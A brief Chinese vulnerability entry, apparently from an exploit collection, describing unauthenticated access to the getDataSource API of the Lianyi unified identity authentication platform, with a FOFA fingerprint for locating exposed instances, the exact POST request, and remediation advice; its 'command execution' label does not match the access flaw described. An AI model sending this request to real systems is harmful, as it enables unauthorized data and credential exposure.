# 联奕统一身份认证平台getDataSource未授权访问

联奕统一身份认证平台getDataSou ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="772658742"`
- **请求**：`POST /api/bd-mdp/serviceManager/outInterface/getDataSource HTTP/1.1`

**Payload**
```
1. Fofa
icon_hash="772658742"
2、隐患url,复现如下
Host: {{Hostname}}
Content-Length: 0
Accept-Charset: utf-8
```
- **其他**：修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。